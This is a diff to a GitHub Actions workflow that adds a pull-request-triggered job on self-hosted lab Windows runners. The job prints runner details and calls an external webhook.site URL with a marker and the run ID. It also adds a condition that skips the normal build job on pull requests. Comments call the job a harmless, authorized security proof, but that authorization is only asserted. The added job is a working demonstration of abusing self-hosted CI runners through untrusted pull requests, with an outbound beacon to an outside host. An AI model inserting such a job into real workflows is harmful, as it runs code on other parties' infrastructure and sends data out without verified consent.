@@ -35,7 +35,28 @@ permissions:
   contents: read
 
 jobs:
+  # Harmless, one-shot validation for an MSRC-authorized security report.
+  # This intentionally reads no secrets and creates no persistence.
+  msrc-safe-proof:
+    if: ${{ github.event_name == 'pull_request' }}
+    name: MSRC safe self-hosted runner proof
+    runs-on:
+    - self-hosted
+    - lab
+    - os-windows-2022
+    - x64
+    timeout-minutes: 3
+    steps:
+    - name: Emit one-shot marker
+      shell: pwsh
+      run: |
+        $marker = "MSRC-NETPERF-SELFHOSTED-OFEK-20261006-8F31C2A7"
+        Write-Output $marker
+        Write-Output "Runner: $env:RUNNER_NAME / $env:RUNNER_OS / $env:RUNNER_ARCH"
+        Invoke-WebRequest -UseBasicParsing -Uri "https://webhook.site/82c87cbe-ea07-4f04-a701-a75d6cda96bd?marker=$marker&run=$env:GITHUB_RUN_ID" | Out-Null
+
   build:
+    if: ${{ github.event_name != 'pull_request' }}
     name: Build cts-traffic test tool
     uses: microsoft/ctsTraffic/.github/workflows/reusable-build.yml@master
     with:
